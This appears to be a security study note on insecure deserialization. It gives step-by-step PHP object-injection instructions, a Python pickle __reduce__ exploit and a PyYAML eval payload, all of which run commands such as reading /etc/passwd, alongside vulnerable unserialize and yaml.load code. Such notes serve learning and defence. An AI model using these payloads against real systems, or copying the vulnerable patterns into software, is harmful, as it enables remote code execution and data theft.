## Deserialization

The decoding and transformation of user supplied data into language objects can result in remote code execution.

## PHP

[ref](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure Deserialization/PHP.md)

1. Look at code

2. Identify functions that do something malicious based on user input. Like:

   ```php
   class Foo{
       private $cmd = "ls";
       function __toString() {
           return system($this->cmd);
       }
   }
   ```

3. Find out where they are executed

   ```php
   $x = unserialize($_GET["data"]);
   echo $x;
   ```

4. Write class that sets parameters to what you want. Methods cannot be overridden.

   ```php
   class Foo{
       private $cmd = "cat /etc/passwd";
   }
   ```

5. Instantiate and serialize class

   ```php
   $f = new Foo();
   echo serialize($f);
   ```

**Things to note**:

- You cannot override methods
- You do not need to deserialize to a class that is correct, any class will do as long as it is loaded by the compiler



## Python pickle

[pickle — Python object serialization — Python 3.9.4 documentation](https://docs.python.org/3/library/pickle.html)

**Vulnerable code**:

```python
# Attacker's code
import os
import pickle

class Exploit:
    def __reduce__(self):
        # os doesn't need to be imported on the victim
        return os.system, ("cat /etc/passwd",)
    
pic = pickle.dumps(Exploit())

# Victim's code
data = pickle.loads(pic)
```

**Notes**:

- Python version must match
- All python versions are vulnerable



## YAML deserialization

[ref](https://github.com/yaml/pyyaml/issues/420)

**Payload**:

```yaml
!!python/object/new:tuple 
- !!python/object/new:map 
  - !!python/name:eval
  - [ "print(__import__('os').system('ls'))" ]
```

**Vulnerable code:**

```python
import yaml
yaml.load(payload)
```



